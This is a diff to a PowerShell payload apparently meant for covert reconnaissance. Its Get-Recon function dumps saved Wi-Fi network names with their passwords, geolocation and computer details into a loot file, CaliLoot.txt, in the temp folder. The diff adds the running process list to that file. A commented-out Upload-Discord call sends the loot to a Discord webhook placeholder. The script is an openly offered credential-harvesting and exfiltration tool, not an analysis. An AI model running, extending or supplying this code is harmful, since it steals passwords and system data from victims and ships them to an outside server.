@@ -55,9 +55,12 @@ function Get-Recon {
             Get-Networks | ForEach-Object {
                 "SSID: $($_.ProfileName), Password: $($_.ProfilePassword)" | Out-File -FilePath $outputFile -Append
             }
-
+			
             "Computer Information:" | Out-File -FilePath $outputFile -Append
             Get-ComputerInfo | Out-File -FilePath $outputFile -Append
+
+            "Process Information:" | Out-File -FilePath $outputFile -Append
+            Get-Process | Out-File -FilePath $outputFile -Append
         }
         else {
             "Failed to retrieve geolocation information." | Out-File -FilePath $outputFile -Append
@@ -85,4 +88,4 @@ function Upload-Discord {
 
 #Get-Recon
 
-#Upload-Discord -webhookUrl 'WEBHOOK GOES HERE' -file "$env:TEMP\CaliLoot.txt" | Out-Null
+#Upload-Discord -webhookUrl 'YOUR DISCORD WEBHOOK HERE' -file "$env:TEMP\CaliLoot.txt" | Out-Null
